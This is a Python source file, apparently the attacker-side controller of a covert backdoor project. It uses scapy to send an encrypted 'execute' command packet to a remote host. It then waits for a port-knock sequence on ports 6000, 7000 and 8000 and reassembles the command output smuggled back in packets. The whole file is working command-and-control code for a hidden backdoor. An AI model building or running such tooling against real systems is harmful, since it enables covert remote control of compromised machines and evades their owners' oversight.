#   Run Command
#
#   Details -
#   Execute a command on a remote host
#
#   Usage   -
#   Run from attacker.sh
#
#   Author  Date        Description
#   GSM     NOV-16      File Creation
#   GSM     DEC-02      Run Command Functionality
#   GSM/AM  DEC-06      Rest
#

#   Imports
from argparse   import ArgumentParser
from scapy.all  import *
from utils import *

#   Constants

#   Variables
Knocked = False

#   Set Arguments
parser = ArgumentParser ( )
parser.add_argument ( "-c", "--command", dest = "command", help = "Command to execute" )
arguments = parser.parse_args ( )

#   Process File
def RunCommand ( ):
    #   Send Packet Looking For File
    payload = "execute" + " " + arguments.command

    print ( "[+] Sending: " + arguments.command )

    if ( protocol == "tcp" ):
        packet  = IP ( src = source, dst = dest ) / TCP ( sport = int ( port ), dport = int ( port ) ) / encrypt( payload )
        send ( packet )
    else:
        print ( "[-] Invalid Protocol Selected" )
        return

        #   While knocked is false, listen for knock. If knocked is true, listen and process responses.
    while ( True ):
        print ( "[+] Listening For Knock" )
        first_knock = sniff ( filter = "port " + str(6000), count = 1 )
        second_knock = sniff ( filter = "port " + str(7000), count = 1 )
        third_knock = sniff ( filter = "port " + str(8000), count = 1 )

        if ( first_knock[0].time - second_knock[0].time < 5 and second_knock[0].time - third_knock[0].time < 5 ):
            print ( "[+] Knock Received" )
            # Send Packet to let backdoor know that knock was received
            payload = "knock is accepted"
            if ( protocol == "tcp" ):
                packet  = IP ( src = source, dst = dest ) / TCP ( sport = int ( port ), dport = int ( port ) ) / encrypt ( payload )
                send ( packet )
                Knocked = True
                break
            
    #   Process Response
    print ( "[+] Waiting For Response" )
    capture = sniff ( filter = "host " + source + " and port " + port, count = 2 )
    counter = decrypt(capture[0].payload.load)
    print ( "[+] Packets To Receive: " + str ( counter ) )

    towrite = ""
    packetsreceived = 0
    runs = int ( counter )
    index = 0
    estimated_time = timeout * runs * 1.2

    print ( "[+] Estimated Time: " + str ( estimated_time ) + " seconds" )

    capture = sniff ( filter = "host " + source + " and port " + port, count = 2 * runs, timeout = estimated_time * 1.2 )
    for a in range ( len ( capture ) / 2 ):
        index = a * 2
        data = decrypt(capture[index].payload.load)
        packetsreceived += 1
        towrite = towrite + data

    print ( "[+] Total Packts Received: " + str ( packetsreceived ) + "/" + counter + "\n" )

    print ( towrite )

    #   Handle Error
    print ( "[+] Command Response Received" )

#   Main
print ( "[+] Command Execution" )

#   Read Configuration File
with open ( "config.txt", "r" ) as sendfile:
    config = sendfile.readlines ( )

count = 1
for line in config:
    if ( count == 1 ):
        source = line.rstrip ( )
    elif ( count == 2 ):
        dest = line.rstrip ( )
    elif ( count == 3 ):
        port = line.rstrip ( )
    elif ( count == 4 ):
        protocol = line.rstrip ( )
    elif ( count == 5 ):
        timeout = float ( line.rstrip ( ) )

    count += 1

RunCommand ( )
